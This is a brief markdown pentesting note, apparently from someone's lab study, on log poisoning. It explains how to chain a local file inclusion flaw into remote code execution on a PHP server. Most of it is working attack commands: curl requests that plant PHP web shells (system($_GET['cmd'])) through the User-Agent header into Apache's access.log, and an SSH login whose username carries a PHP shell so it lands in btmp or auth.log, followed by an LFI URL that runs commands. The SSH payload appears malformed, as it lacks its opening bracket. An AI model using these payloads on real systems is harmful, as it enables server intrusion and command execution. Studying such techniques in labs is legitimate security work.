
# Definition

How to convert the [[LFI]] to RCE (Remote Code Execution) using the log of the system

---

# Apache2

In /var/log exists **access.log** that all the request that you doing 

You can try to change the user-agent

> curl -s -X GET "http://localhost/probando" -H "User-Agent: Probando"

If the website interpret php and the function system is enable you can inject command:

You can try if the function system is enabled, you can inject this:

````bash
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php phpinfo() ?>"
````

In the table you can search by **disable_functions** and see if system or another is off

> curl -s -X GET "http://localhost/probando" -H "User-Agent: \<?php system('whoami'); ?>"

And then insert a parameter to inject command with the explorer:

````bash
curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
````

---

# SSH

Normally the file in this case is **/var/log/auth.log**
Or
Other file that is called **btmp**

==Important==
This work** if others can read of this file** you can try to connect with ssh like this:

In my case i have to add the user www-data to the group **utmp** with this comand
````bash
usermod -a -G utmp www-data
````

And restart the service apache2

````php
ssh '?php system($_GET['cmd']); ?>'@172.17.0.2
````



And in the explore put this url:

> http://localhost/index.php?filename=/var/log/btmp&cmd=id


---

# Tags

#logpoisoning #lfi #rce

---